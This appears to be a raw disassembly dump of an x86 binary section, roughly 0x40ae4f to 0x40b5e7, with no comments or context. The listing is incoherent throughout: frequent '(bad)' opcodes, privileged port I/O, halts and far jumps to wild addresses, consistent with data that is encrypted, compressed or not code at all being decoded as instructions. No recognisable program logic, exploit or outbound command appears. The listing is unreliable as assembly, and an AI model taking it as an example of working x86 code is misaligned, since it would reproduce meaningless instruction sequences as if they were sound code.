  40ae4f:	jno    0x40aea6
  40ae51:	inc    edi
  40ae52:	mov    dh,0x2
  40ae54:	out    0xad,eax
  40ae56:	xchg   bh,cl
  40ae58:	adc    DWORD PTR [esi],ebp
  40ae5a:	xor    BYTE PTR [edi-0x3543c7d8],ch
  40ae60:	add    al,0x3e
  40ae62:	add    al,0x77
  40ae64:	mov    ss,WORD PTR fs:[edi+ebx*8+0x17750bea]
  40ae6c:	xchg   esp,eax
  40ae6d:	push   esp
  40ae6e:	mov    ebp,0x600def4d
  40ae73:	(bad)  
  40ae74:	loopne 0x40aec9
  40ae76:	dec    edi
  40ae77:	cmp    eax,0x9c889879
  40ae7c:	jo     0x40aefb
  40ae7e:	push   ds
  40ae7f:	int3   
  40ae80:	push   ecx
  40ae81:	mov    ecx,0xbf3d527c
  40ae86:	pop    eax
  40ae87:	dec    esp
  40ae88:	add    eax,0x65cb1e8a
  40ae8d:	mov    esp,0x1c42b064
  40ae92:	or     DWORD PTR [edi],ecx
  40ae94:	test   al,0x1
  40ae96:	setl   BYTE PTR [esi]
  40ae99:	(bad)  
  40ae9a:	push   ecx
  40ae9b:	xchg   edx,eax
  40ae9c:	xchg   ecx,eax
  40ae9d:	or     edi,DWORD PTR [edi+edi*2-0x7b]
  40aea1:	sbb    DWORD PTR [esi-0x5113d013],ebx
  40aea7:	jne    0x40aed1
  40aea9:	jnp    0x40af27
  40aeab:	jae    0x40ae41
  40aead:	or     BYTE PTR [edi],bl
  40aeaf:	int    0x73
  40aeb1:	push   edx
  40aeb2:	dec    esi
  40aeb3:	dec    ecx
  40aeb4:	fadd   DWORD PTR [esi-0x6fa452d4]
  40aeba:	out    dx,al
  40aebb:	in     al,0x91
  40aebd:	and    dh,BYTE PTR [esi-0x41]
  40aec0:	call   0x337a00a2
  40aec5:	por    mm2,mm6
  40aec8:	mov    esp,0x1d48259f
  40aecd:	mov    ds:0xfcc5e063,eax
  40aed2:	push   esi
  40aed3:	sar    bh,0x6d
  40aed6:	mov    edi,0x71703e22
  40aedb:	lods   al,BYTE PTR ds:[esi]
  40aedc:	ins    DWORD PTR es:[edi],dx
  40aedd:	xor    DWORD PTR [ebp+0x31849a97],ecx
  40aee3:	xor    al,0x27
  40aee5:	fcmovu st,st(5)
  40aee7:	jecxz  0x40af34
  40aee9:	adc    eax,esi
  40aeeb:	jnp    0x40ae6f
  40aeed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aeee:	das    
  40aeef:	xchg   ecx,eax
  40aef0:	fdivr  st,st(5)
  40aef2:	or     al,0x12
  40aef4:	stos   DWORD PTR es:[edi],eax
  40aef5:	mov    dh,dh
  40aef7:	mov    al,0x65
  40aef9:	xor    DWORD PTR [edx+0x7e272463],esp
  40aeff:	in     al,dx
  40af00:	inc    ecx
  40af01:	inc    edi
  40af02:	aam    0xec
  40af04:	retf   
  40af05:	xchg   ebp,eax
  40af06:	outs   dx,BYTE PTR ds:[esi]
  40af07:	pop    ecx
  40af08:	and    al,0x20
  40af0a:	xlat   BYTE PTR ds:[ebx]
  40af0b:	xor    dl,BYTE PTR [eax]
  40af0d:	adc    eax,0x80a02fd1
  40af12:	call   0xbb7:0x1186ad3
  40af19:	push   0xa654bbeb
  40af1e:	enter  0x906b,0x7d
  40af22:	adc    eax,0xb5b678b5
  40af27:	sub    al,0xfc
  40af29:	dec    ecx
  40af2a:	mov    fs,WORD PTR [ecx]
  40af2c:	sbb    dh,BYTE PTR [ebx+0x63]
  40af2f:	fcomip st,st(6)
  40af31:	repnz (bad) 
  40af33:	hlt    
  40af34:	ins    DWORD PTR es:[edi],dx
  40af35:	xchg   DWORD PTR [eax],esi
  40af37:	jne    0x40aef9
  40af39:	xlat   BYTE PTR ds:[ebx]
  40af3a:	lods   eax,DWORD PTR ds:[esi]
  40af3b:	stos   DWORD PTR es:[edi],eax
  40af3c:	pop    es
  40af3d:	(bad)  
  40af3e:	fcom   DWORD PTR [eax-0x6b]
  40af41:	sbb    BYTE PTR [edi-0x44],bl
  40af44:	fiadd  WORD PTR [ebx+0x30bc7d81]
  40af4a:	retf   0x312
  40af4d:	rol    dl,1
  40af4f:	mov    DWORD PTR [edi-0xf],0xa0a499ea
  40af56:	je     0x40af82
  40af58:	inc    di
  40af5a:	and    DWORD PTR [edi-0x55],esp
  40af5d:	iret   
  40af5e:	sbb    ecx,DWORD PTR [esi+0xb]
  40af61:	in     eax,0xa5
  40af63:	jnp    0x40aef7
  40af65:	cs mov bh,0xa9
  40af68:	push   eax
  40af69:	xchg   esi,eax
  40af6a:	test   eax,0xeecb6995
  40af6f:	aad    0xcb
  40af71:	cmp    ah,BYTE PTR [edx+0x214bc2a4]
  40af77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af78:	sub    esp,DWORD PTR [ebp+0x7594f5c]
  40af7e:	je     0x40afd5
  40af80:	or     dl,BYTE PTR [ecx]
  40af82:	cmp    BYTE PTR [esi-0x7d],ah
  40af85:	sti    
  40af86:	push   0x79
  40af88:	ds mov bh,0xb4
  40af8b:	push   ss
  40af8c:	aaa    
  40af8d:	jecxz  0x40af8c
  40af8f:	dec    ecx
  40af90:	mov    WORD PTR [esi-0x668151c4],fs
  40af96:	xor    cl,dl
  40af98:	stc    
  40af99:	mov    esp,0xa5be932e
  40af9e:	fs mov eax,0xa8b7327c
  40afa4:	inc    ebx
  40afa5:	aaa    
  40afa6:	mov    ah,BYTE PTR [edi+0x7e]
  40afa9:	pop    esi
  40afaa:	clc    
  40afab:	cmp    dl,BYTE PTR [ebx-0x7b]
  40afae:	sub    eax,0x294631d1
  40afb3:	inc    ecx
  40afb4:	lds    ecx,FWORD PTR [ecx]
  40afb6:	inc    ebp
  40afb7:	xchg   DWORD PTR [ebp+0x47814ebd],edx
  40afbd:	test   al,0xc4
  40afbf:	and    ebp,DWORD PTR [ebp+0x746e518e]
  40afc5:	gs aam 0xf5
  40afc8:	mov    ds:0x4ffe436f,al
  40afcd:	jp     0x40b03a
  40afcf:	pop    edi
  40afd0:	xchg   BYTE PTR [ebx-0x68a712ee],cl
  40afd6:	add    ch,BYTE PTR [ebp+0x4373c28b]
  40afdc:	pop    eax
  40afdd:	xchg   esp,eax
  40afde:	pusha  
  40afdf:	fstp   st(7)
  40afe1:	cld    
  40afe2:	adc    DWORD PTR [esi-0x787da649],ebp
  40afe8:	mov    ebp,DWORD PTR [edi+0x1a]
  40afeb:	aad    0xb0
  40afed:	xor    al,0xd2
  40afef:	pusha  
  40aff0:	rol    DWORD PTR [ebx],1
  40aff2:	dec    esp
  40aff3:	and    ebp,edx
  40aff5:	jle    0x40b027
  40aff7:	outs   dx,BYTE PTR ds:[esi]
  40aff8:	adc    BYTE PTR [ecx],cl
  40affa:	and    esi,esp
  40affc:	or     BYTE PTR [eax+0x7],ah
  40afff:	pop    ebx
  40b000:	jg     0x40afea
  40b002:	dec    ebp
  40b003:	aas    
  40b004:	iret   
  40b005:	test   ch,ah
  40b007:	cdq    
  40b008:	aaa    
  40b009:	scas   al,BYTE PTR es:[edi]
  40b00a:	shr    BYTE PTR [ebx+edx*8-0x159222dc],cl
  40b011:	cmp    BYTE PTR [esi],al
  40b013:	mov    eax,ds:0xf029b0b3
  40b018:	std    
  40b019:	inc    ebx
  40b01a:	push   ebp
  40b01b:	daa    
  40b01c:	mov    cl,0x4
  40b01e:	sbb    al,bl
  40b020:	mov    ds:0x64b64440,eax
  40b025:	loope  0x40b0a0
  40b027:	fsubr  QWORD PTR [ebx+0x5df4b659]
  40b02d:	jp     0x40b04e
  40b02f:	(bad)  
  40b030:	mov    ah,0x21
  40b032:	xchg   edx,eax
  40b033:	lods   eax,DWORD PTR ds:[esi]
  40b034:	(bad)  
  40b035:	jp     0x40b085
  40b037:	push   0xffffff97
  40b039:	and    dh,BYTE PTR [edi+edx*1+0xd]
  40b03d:	fistp  DWORD PTR [esi+0x557c8d05]
  40b043:	bound  eax,QWORD PTR [esi+0x1]
  40b046:	push   eax
  40b047:	mov    ecx,DWORD PTR [edx]
  40b049:	sti    
  40b04a:	sahf   
  40b04b:	test   eax,0x38e516ac
  40b050:	and    eax,0x816a0e91
  40b055:	add    BYTE PTR [ebp-0x4d],dh
  40b058:	in     eax,0xb9
  40b05a:	mov    ebx,0x150c3ac4
  40b05f:	mov    dh,0x2a
  40b061:	inc    ecx
  40b062:	pop    ds
  40b063:	push   esi
  40b064:	in     al,0x77
  40b066:	cli    
  40b067:	inc    ecx
  40b068:	cmp    edx,DWORD PTR [ebx+0x74eb73d7]
  40b06e:	xchg   edi,eax
  40b06f:	les    ebp,FWORD PTR [eax+0x27]
  40b072:	rcl    edx,cl
  40b074:	imul   ebx,DWORD PTR [edi+0x2ae1af15],0x4f
  40b07b:	push   esi
  40b07c:	jmp    0x2886cba8
  40b081:	xchg   edi,eax
  40b082:	adc    ebx,DWORD PTR [esi-0x2a]
  40b085:	push   0x53f4bec1
  40b08a:	mov    edx,esp
  40b08c:	das    
  40b08d:	retf   0x98e4
  40b090:	rol    DWORD PTR [edx],cl
  40b092:	int    0x7d
  40b094:	mov    ebx,DWORD PTR [ebp+0x4b6922b6]
  40b09a:	jmp    0x40b065
  40b09c:	repz inc ebx
  40b09e:	mov    ds:0xda39f4a7,eax
  40b0a3:	bound  esi,QWORD PTR [edi]
  40b0a5:	and    DWORD PTR [edi],edi
  40b0a7:	push   esp
  40b0a8:	or     eax,0xe5abc994
  40b0ad:	scas   eax,DWORD PTR es:[edi]
  40b0ae:	mov    ecx,0x78cbc108
  40b0b3:	imul   ecx,DWORD PTR [edx-0x64599022],0xffffffd2
  40b0ba:	je     0x40b104
  40b0bc:	sbb    al,0xe2
  40b0be:	rol    BYTE PTR [eax+0x5c],cl
  40b0c1:	mov    ecx,DWORD PTR [ecx+0x2b0a417b]
  40b0c7:	push   es
  40b0c8:	mov    edi,0xc9546925
  40b0cd:	cwde   
  40b0ce:	sti    
  40b0cf:	xlat   BYTE PTR ds:[ebx]
  40b0d0:	loope  0x40b07d
  40b0d2:	inc    edi
  40b0d3:	lea    eax,[edi+0x30d62cc1]
  40b0d9:	xor    cl,BYTE PTR [edi+0x47]
  40b0dc:	sahf   
  40b0dd:	xchg   BYTE PTR [edi+0x27ccf507],dl
  40b0e3:	xchg   esp,eax
  40b0e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0e5:	out    dx,al
  40b0e6:	pop    edx
  40b0e7:	pop    es
  40b0e8:	inc    ebx
  40b0ea:	push   ebp
  40b0eb:	or     eax,0xb8a16d7f
  40b0f0:	not    BYTE PTR [ecx+0x7440a80e]
  40b0f6:	not    ecx
  40b0f8:	add    al,BYTE PTR [eax+esi*2]
  40b0fb:	mov    edi,0xb0abab29
  40b100:	mov    cl,0xbc
  40b102:	shl    BYTE PTR [ecx+0x6c],0xd0
  40b106:	sbb    DWORD PTR [ebp-0x4ebbf781],0xd8a1548
  40b110:	pop    ebp
  40b111:	out    dx,al
  40b112:	xor    eax,0x6817c2ac
  40b117:	and    esp,DWORD PTR [eax]
  40b119:	dec    esp
  40b11a:	dec    esp
  40b11b:	imul   eax,DWORD PTR ds:0xb0cbad0a,0x6b
  40b122:	arpl   WORD PTR [esp+edx*4+0xde792d3],sp
  40b129:	outs   dx,DWORD PTR ds:[esi]
  40b12a:	movaps xmm6,xmm7
  40b12d:	and    eax,0xd0c171d1
  40b132:	jg     0x40b0ec
  40b134:	lods   eax,DWORD PTR ds:[esi]
  40b135:	in     eax,0xdf
  40b137:	cdq    
  40b138:	rcl    BYTE PTR [esi-0x16],cl
  40b13b:	in     al,0x9a
  40b13d:	ret    
  40b13e:	ficomp DWORD PTR [ecx+0x48275685]
  40b144:	in     al,0x9b
  40b146:	xchg   ebp,eax
  40b147:	cmc    
  40b148:	push   DWORD PTR [esp+ebx*8-0x2b]
  40b14c:	add    DWORD PTR [edx-0x318c75ed],edi
  40b152:	rcl    DWORD PTR [edx+eax*1+0x5b06a97e],0x10
  40b15a:	inc    edi
  40b15b:	repz test DWORD PTR [ecx+0x7a],esp
  40b15f:	js     0x40b14b
  40b161:	mov    DWORD PTR [edi-0x3ac24384],ecx
  40b167:	mov    ecx,0x7f270301
  40b16c:	in     eax,0xa4
  40b16e:	xor    al,0x30
  40b170:	lahf   
  40b171:	popa   
  40b172:	call   0x5ed3:0xcb496714
  40b179:	sub    DWORD PTR [edx-0xcbe6072],esi
  40b17f:	dec    eax
  40b180:	inc    eax
  40b181:	sti    
  40b182:	test   BYTE PTR [esi+ebp*4],al
  40b185:	xchg   BYTE PTR [ebx],bh
  40b187:	cmp    eax,0x2687649
  40b18c:	push   ebp
  40b18d:	sbb    esi,esi
  40b18f:	sbb    ebp,DWORD PTR ds:0xbd3579e5
  40b195:	ror    BYTE PTR [eax+ebx*2+0x6192ff41],0x7a
  40b19d:	mov    edi,0x8195b5e
  40b1a2:	xor    DWORD PTR [ecx+0x1f],ebx
  40b1a5:	pop    es
  40b1a6:	lock ret 
  40b1a8:	push   ebp
  40b1a9:	mov    ?,WORD PTR [ecx-0x78eb511a]
  40b1af:	loopne 0x40b170
  40b1b1:	js     0x40b15f
  40b1b3:	inc    edi
  40b1b4:	test   al,0x55
  40b1b6:	in     eax,0x33
  40b1b8:	cmp    eax,0x3d94b377
  40b1bd:	cld    
  40b1be:	and    dh,ah
  40b1c0:	or     DWORD PTR [ebp-0x4e],edi
  40b1c3:	and    eax,0x71b61e12
  40b1c8:	xor    BYTE PTR [edx+eax*4],al
  40b1cb:	cs jmp 0x6e60:0xb0e535ef
  40b1d3:	and    BYTE PTR [eax+0x1bed6a08],bl
  40b1d9:	sub    al,0x70
  40b1db:	fisub  WORD PTR [edi]
  40b1dd:	js     0x40b1d8
  40b1df:	sub    eax,0x6edfd798
  40b1e4:	push   ecx
  40b1e5:	dec    eax
  40b1e6:	cwde   
  40b1e7:	ds pop edi
  40b1e9:	add    BYTE PTR [eax+0x5],dh
  40b1ec:	aad    0x45
  40b1ee:	shl    cl,1
  40b1f0:	ret    
  40b1f1:	dec    ecx
  40b1f2:	(bad)  
  40b1f3:	jecxz  0x40b1a4
  40b1f5:	pop    edi
  40b1f6:	in     al,dx
  40b1f7:	jb     0x40b1f7
  40b1f9:	mov    edx,0xbb456df9
  40b1fe:	sub    ebp,DWORD PTR [eax+0x29]
  40b201:	push   edi
  40b202:	fild   DWORD PTR [ebp+ecx*2+0x78]
  40b206:	(bad)  
  40b208:	imul   eax,ebp,0x6e1242c5
  40b20e:	adc    DWORD PTR [ebx+0x2f],0x52
  40b212:	add    ch,dh
  40b214:	into   
  40b215:	cld    
  40b216:	inc    edi
  40b217:	push   edi
  40b218:	mov    esi,0xa880ee15
  40b21d:	fs dec ecx
  40b21f:	pop    es
  40b220:	push   edx
  40b221:	xchg   edx,eax
  40b222:	cli    
  40b223:	add    eax,0x430844e0
  40b228:	mov    ebp,DWORD PTR [ebx-0x755f1b5c]
  40b22e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b22f:	mov    eax,0xb92caf8c
  40b234:	sbb    eax,esi
  40b236:	push   esi
  40b237:	adc    eax,0xe150e327
  40b23c:	mov    dh,0x8e
  40b23e:	out    dx,al
  40b23f:	xor    DWORD PTR [eax],eax
  40b241:	loop   0x40b27e
  40b243:	out    dx,al
  40b244:	add    BYTE PTR [ebx+0x6779dc78],ch
  40b24a:	mov    al,0x85
  40b24c:	sub    bh,BYTE PTR [ebx-0x69d1f96a]
  40b252:	sub    al,0x5d
  40b254:	push   ebp
  40b255:	arpl   WORD PTR [esi],dx
  40b257:	cdq    
  40b258:	cmp    al,0x38
  40b25a:	out    dx,al
  40b25b:	call   0xb960a332
  40b260:	lods   al,BYTE PTR ds:[esi]
  40b261:	std    
  40b262:	mov    eax,DWORD PTR [esi+0x442fd0f8]
  40b268:	cwde   
  40b269:	push   ds
  40b26a:	jge    0x40b224
  40b26c:	mov    edx,0x227e0f1a
  40b271:	aam    0x32
  40b273:	mov    dl,0x3d
  40b275:	mov    al,0x7
  40b277:	xchg   ebx,eax
  40b278:	je     0x40b254
  40b27a:	test   al,0x77
  40b27c:	(bad)  
  40b27d:	jb     0x40b242
  40b27f:	shr    DWORD PTR [esi],0xfe
  40b282:	mov    BYTE PTR [esi-0x18],ah
  40b285:	pop    ecx
  40b286:	iret   
  40b287:	push   edi
  40b288:	nop
  40b289:	(bad)  [eax+0x40]
  40b28c:	xchg   esp,eax
  40b28d:	ss jo  0x40b23b
  40b290:	out    0x91,al
  40b292:	sbb    ebx,edx
  40b294:	test   al,0x85
  40b296:	dec    esi
  40b297:	imul   ebp,esp,0xffffffde
  40b29a:	je     0x40b2de
  40b29c:	jb     0x40b2b8
  40b29e:	mov    al,ds:0x7a676e79
  40b2a3:	cld    
  40b2a4:	(bad)  
  40b2a5:	and    BYTE PTR [edi+0x32],bh
  40b2a8:	inc    ebx
  40b2a9:	in     eax,dx
  40b2aa:	sub    DWORD PTR [ecx+0x1426a649],0x614aa459
  40b2b4:	outs   dx,DWORD PTR ds:[esi]
  40b2b5:	stos   BYTE PTR es:[edi],al
  40b2b6:	xchg   esp,eax
  40b2b7:	inc    esp
  40b2b8:	jp     0x40b288
  40b2ba:	mov    eax,0xd6989f74
  40b2bf:	mov    esi,0xcbbbb700
  40b2c4:	mov    ds:0x34334675,al
  40b2c9:	add    eax,0xb492fbee
  40b2ce:	inc    esp
  40b2cf:	jae    0x40b253
  40b2d1:	inc    ebp
  40b2d2:	jmp    0xc93b9f4c
  40b2d7:	lock mov ds:0xfafc12ac,al
  40b2dd:	add    eax,0x5eb43dd5
  40b2e2:	sbb    DWORD PTR [esi],0x57
  40b2e5:	or     DWORD PTR [ebx+0x7972039f],esp
  40b2eb:	sahf   
  40b2ec:	ja     0x40b32c
  40b2ee:	mov    ch,0x23
  40b2f0:	test   bh,dl
  40b2f2:	sub    eax,0x45bb05d6
  40b2f7:	push   edx
  40b2f8:	mov    ds:0x753bb20b,eax
  40b2fd:	lods   eax,DWORD PTR ds:[esi]
  40b2fe:	aas    
  40b2ff:	out    dx,al
  40b300:	sbb    al,0x16
  40b302:	pop    edi
  40b303:	push   ecx
  40b304:	sbb    edx,DWORD PTR [edx+0x44d1f603]
  40b30a:	fwait
  40b30b:	in     eax,0xe8
  40b30d:	fwait
  40b30e:	sbb    al,0x78
  40b310:	xchg   BYTE PTR [edx+edx*8+0x56],cl
  40b314:	pusha  
  40b315:	adc    eax,DWORD PTR [esi+0x1b]
  40b318:	(bad)  
  40b31a:	mov    bh,0x5b
  40b31c:	(bad)  
  40b31d:	loop   0x40b30d
  40b31f:	or     BYTE PTR [eax-0x1be613e6],0xe5
  40b326:	lods   eax,DWORD PTR ds:[esi]
  40b327:	mov    eax,ds:0xb06ef075
  40b32c:	mov    eax,0x8286caf4
  40b331:	pop    ss
  40b332:	pusha  
  40b333:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b335:	mov    dl,0x4a
  40b337:	sub    BYTE PTR [esi-0x7f11be4e],al
  40b33d:	gs mov edi,0xf148c5ea
  40b343:	aaa    
  40b344:	xor    eax,0x4b5abc78
  40b349:	pop    eax
  40b34a:	add    DWORD PTR [eax-0x57206205],edx
  40b350:	hlt    
  40b351:	outs   dx,BYTE PTR ds:[esi]
  40b352:	loope  0x40b302
  40b354:	and    esi,eax
  40b356:	addr16 push 0x9e0ae173
  40b35c:	xor    BYTE PTR [edi-0x31],0x30
  40b360:	mov    ebp,0x46462ab1
  40b365:	retf   
  40b366:	push   ss
  40b367:	ret    0xd69c
  40b36a:	jmp    0xa3c3:0x6d0323fe
  40b371:	jnp    0x40b334
  40b373:	mov    ?,WORD PTR [esi-0x48057d17]
  40b379:	sbb    dh,BYTE PTR [ecx+0x76457093]
  40b37f:	cmp    eax,0x6570691f
  40b384:	mov    ch,0x9b
  40b386:	xchg   edx,eax
  40b387:	adc    dh,BYTE PTR [edx-0x79c9a9f5]
  40b38d:	push   edi
  40b38e:	sbb    al,0x14
  40b390:	into   
  40b391:	shr    ebp,0xea
  40b394:	inc    ecx
  40b395:	lds    ecx,FWORD PTR [edi]
  40b397:	and    DWORD PTR [ebp+0x185ba8f8],edi
  40b39d:	jne    0x40b3b4
  40b39f:	adc    esp,DWORD PTR [esi-0x72]
  40b3a2:	inc    ebx
  40b3a3:	push   0xd914ab1f
  40b3a8:	lahf   
  40b3a9:	call   0x18082c7a
  40b3ae:	data16 jge 0x40b3e5
  40b3b1:	sti    
  40b3b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3b3:	mov    al,0xa6
  40b3b5:	arpl   dx,dx
  40b3b7:	cmc    
  40b3b8:	ficomp DWORD PTR [edx-0x33]
  40b3bb:	inc    esp
  40b3bc:	and    BYTE PTR [ebx],0x20
  40b3bf:	in     al,dx
  40b3c0:	(bad)  fs:[ecx-0x30]
  40b3c4:	mov    DWORD PTR [eax+ebp*4-0x54e5f3bf],edx
  40b3cb:	mov    DWORD PTR [eax+0x1fb4a18f],0xf388b2e5
  40b3d5:	(bad)  
  40b3d7:	xchg   esp,eax
  40b3d9:	pop    ecx
  40b3da:	add    al,0x28
  40b3dc:	enter  0x6fc6,0x2d
  40b3e0:	jo     0x40b3f5
  40b3e2:	inc    ebp
  40b3e3:	pop    eax
  40b3e4:	icebp  
  40b3e5:	mov    esp,0xbe46b6bc
  40b3ea:	or     edi,esp
  40b3ec:	dec    ecx
  40b3ed:	cmp    esi,DWORD PTR [ecx]
  40b3ef:	mul    BYTE PTR es:[ebx]
  40b3f2:	jmp    0x40b402
  40b3f4:	dec    ebx
  40b3f5:	pslld  mm2,QWORD PTR [eax-0x71]
  40b3f9:	stos   BYTE PTR es:[edi],al
  40b3fa:	mov    cl,0x7f
  40b3fc:	mov    ds:0x94db621e,al
  40b401:	jecxz  0x40b3c8
  40b403:	(bad)
  40b406:	cmc    
  40b407:	push   ds
  40b408:	and    eax,0x6c72413f
  40b40d:	sahf   
  40b40e:	stc    
  40b40f:	pop    ss
  40b410:	fimul  DWORD PTR [eax+0x40]
  40b413:	pop    ss
  40b414:	inc    edi
  40b415:	xchg   ecx,eax
  40b416:	std    
  40b417:	out    0xf2,al
  40b419:	ficom  WORD PTR [ecx+0x6f]
  40b41c:	shl    DWORD PTR [ebx-0x79768d0b],1
  40b422:	jle    0x40b3a5
  40b424:	adc    DWORD PTR [ebp-0x39],edi
  40b427:	loopne 0x40b459
  40b429:	loopne 0x40b3eb
  40b42b:	aaa    
  40b42c:	dec    ebx
  40b42d:	icebp  
  40b42e:	xor    BYTE PTR [edi+ebp*1-0x715ce437],cl
  40b435:	in     eax,0x2a
  40b437:	rcl    DWORD PTR [ebp-0x32],cl
  40b43a:	jmp    0x40b405
  40b43c:	rol    ecx,1
  40b43e:	inc    eax
  40b43f:	(bad)  
  40b440:	or     ecx,DWORD PTR [edi+0x5d]
  40b443:	xchg   esp,eax
  40b444:	inc    ecx
  40b445:	imul   eax,DWORD PTR [eax+eax*8+0x62af81bd],0xffffffd6
  40b44d:	jo     0x40b45a
  40b44f:	aas    
  40b450:	mov    ds:0xd483759b,eax
  40b455:	lds    edi,FWORD PTR [edi]
  40b457:	push   ebx
  40b458:	mov    bh,0x81
  40b45a:	rcl    BYTE PTR [edi],cl
  40b45c:	mov    es,WORD PTR [ebx]
  40b45e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b45f:	not    BYTE PTR [edi-0x51]
  40b462:	jmp    0xde7b:0x8d63b9e6
  40b469:	dec    ecx
  40b46a:	mov    edx,DWORD PTR [ecx]
  40b46c:	aad    0x22
  40b46e:	mov    eax,0x189e934
  40b473:	mov    cs,WORD PTR [eax+ebx*8-0x5681d8b1]
  40b47a:	and    BYTE PTR [ebp+0x60a23f23],bh
  40b480:	out    dx,al
  40b481:	pop    ecx
  40b482:	xor    eax,0x6fa147d6
  40b487:	aas    
  40b488:	sbb    al,0x7d
  40b48a:	mov    es,WORD PTR [ebx-0x7a]
  40b48d:	les    ebp,FWORD PTR [ecx]
  40b48f:	adc    al,BYTE PTR [esi]
  40b491:	pushf  
  40b492:	mov    bh,ch
  40b494:	ror    BYTE PTR [eax],cl
  40b496:	cli    
  40b497:	dec    esi
  40b498:	cmp    DWORD PTR [eiz*4+0x4ee243ed],0xffffffcf
  40b4a0:	push   esi
  40b4a1:	adc    BYTE PTR [ebx+0x2bd011b1],dl
  40b4a7:	neg    DWORD PTR [esi]
  40b4a9:	sbb    DWORD PTR ds:0x2512e14c,0x0
  40b4b0:	push   es
  40b4b1:	jo     0x40b45b
  40b4b3:	push   esi
  40b4b4:	sub    eax,DWORD PTR [edi]
  40b4b6:	pop    edx
  40b4b7:	lock in al,dx
  40b4b9:	ret    
  40b4ba:	popa   
  40b4bb:	int3   
  40b4bc:	push   es
  40b4bd:	mov    ch,BYTE PTR [eax+0x7b]
  40b4c0:	out    0x27,al
  40b4c2:	jno    0x40b474
  40b4c4:	or     BYTE PTR [edx-0x4aa57edd],0xb5
  40b4cb:	jge    0x40b53d
  40b4cd:	push   eax
  40b4ce:	pop    es
  40b4cf:	push   ecx
  40b4d0:	out    dx,eax
  40b4d1:	lea    esi,[edi-0x2]
  40b4d4:	mov    ecx,0xfe5f0502
  40b4d9:	repz cwde 
  40b4db:	ret    
  40b4dc:	pop    esi
  40b4dd:	adc    DWORD PTR [esi-0x1cd1f24b],ecx
  40b4e3:	in     eax,dx
  40b4e4:	shl    DWORD PTR [ebx+eiz*2],cl
  40b4e7:	cld    
  40b4e8:	imul   edx,DWORD PTR ds:0x6e1387e3,0xffffffca
  40b4ef:	adc    cl,dl
  40b4f1:	add    eax,0xe556b4a9
  40b4f6:	xor    DWORD PTR [esi-0x604302e0],edi
  40b4fc:	pushf  
  40b4fd:	ret    
  40b4fe:	pop    eax
  40b4ff:	mov    esi,0xe56ce8a2
  40b504:	(bad)  
  40b505:	cld    
  40b506:	inc    ebp
  40b507:	aam    0xb7
  40b509:	test   eax,0x7b6b159d
  40b50e:	jp     0x40b4ca
  40b510:	inc    edx
  40b511:	mov    dl,BYTE PTR ds:0xcebed1c3
  40b517:	xchg   esi,eax
  40b518:	aam    0x93
  40b51a:	mov    BYTE PTR [ebp-0x67],bl
  40b51d:	fnstsw WORD PTR [esi-0x1a]
  40b520:	mov    ecx,0xf4d9a91e
  40b525:	mov    ebx,0x9dd1df0a
  40b52a:	aas    
  40b52b:	bound  eax,QWORD PTR [ebp-0x998066f]
  40b531:	repnz mov ebx,0x207a28d4
  40b537:	push   ecx
  40b538:	stos   BYTE PTR es:[edi],al
  40b539:	fld    TBYTE PTR [esi+0x70]
  40b53c:	repnz pop ebx
  40b53e:	outs   dx,BYTE PTR ds:[esi]
  40b53f:	ror    BYTE PTR [ebp-0x79],1
  40b542:	push   ecx
  40b543:	inc    ebp
  40b544:	sub    eax,0xd12063e8
  40b549:	jb     0x40b5b9
  40b54b:	jb     0x40b508
  40b54d:	add    esp,DWORD PTR [ecx]
  40b54f:	cld    
  40b550:	mov    cl,0x51
  40b552:	xlat   BYTE PTR ds:[ebx]
  40b553:	xor    al,0x7f
  40b555:	and    ah,BYTE PTR [ebp-0x3e0d941]
  40b55b:	shrd   DWORD PTR [edi+0x79],edi,0x30
  40b560:	jno    0x40b574
  40b562:	int3   
  40b563:	inc    eax
  40b564:	test   al,0xec
  40b566:	mov    edi,ds
  40b568:	sti    
  40b569:	jge    0x40b539
  40b56b:	adc    al,0xdd
  40b56d:	mov    ch,0xad
  40b56f:	pop    edi
  40b570:	shl    BYTE PTR [ebx+edx*1],cl
  40b573:	test   dl,0x12
  40b576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b577:	(bad)  
  40b578:	mov    ch,0x71
  40b57a:	clc    
  40b57b:	out    dx,eax
  40b57c:	dec    ebx
  40b57d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b57e:	lods   eax,DWORD PTR ds:[esi]
  40b57f:	rcl    BYTE PTR [eax+0x0],cl
  40b582:	push   esi
  40b583:	pusha  
  40b584:	inc    esp
  40b585:	sbb    DWORD PTR [ecx+0x153b98a1],0xffffff9b
  40b58c:	jno    0x40b54e
  40b58e:	inc    esi
  40b58f:	je     0x40b5e6
  40b591:	mov    ebx,0xc77ac59f
  40b596:	fcomp  DWORD PTR [ecx+ebp*8]
  40b599:	pop    ebp
  40b59a:	sbb    bh,BYTE PTR [eax+0x4f5254d1]
  40b5a0:	rcr    dl,0xe1
  40b5a3:	inc    DWORD PTR [esi+0x29ffe040]
  40b5a9:	xchg   edi,eax
  40b5aa:	inc    ebx
  40b5ab:	or     eax,0x1c88df09
  40b5b0:	xchg   ebx,eax
  40b5b1:	mov    al,ds:0xbcbb81e
  40b5b6:	shl    DWORD PTR [esi+0x2],0xf7
  40b5ba:	mov    bh,BYTE PTR [ebx+eax*1-0x11]
  40b5be:	icebp  
  40b5bf:	adc    DWORD PTR [edx],ecx
  40b5c1:	adc    DWORD PTR [ebx],ebx
  40b5c3:	push   ss
  40b5c4:	adc    esi,DWORD PTR [edx-0xc]
  40b5c7:	add    DWORD PTR ds:0x6315f4a5,0xb9a28cf9
  40b5d1:	cmp    al,0x21
  40b5d3:	shl    DWORD PTR [eax],1
  40b5d5:	or     eax,DWORD PTR [ebx-0x7e75b56a]
  40b5db:	fnstsw WORD PTR [ecx+0x6cdbcc16]
  40b5e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5e2:	lea    ecx,[ebx+edx*2]
  40b5e5:	push   esp
  40b5e6:	xchg   ebp,eax
  40b5e7:	xlat   BYTE PTR ds:[ebx]
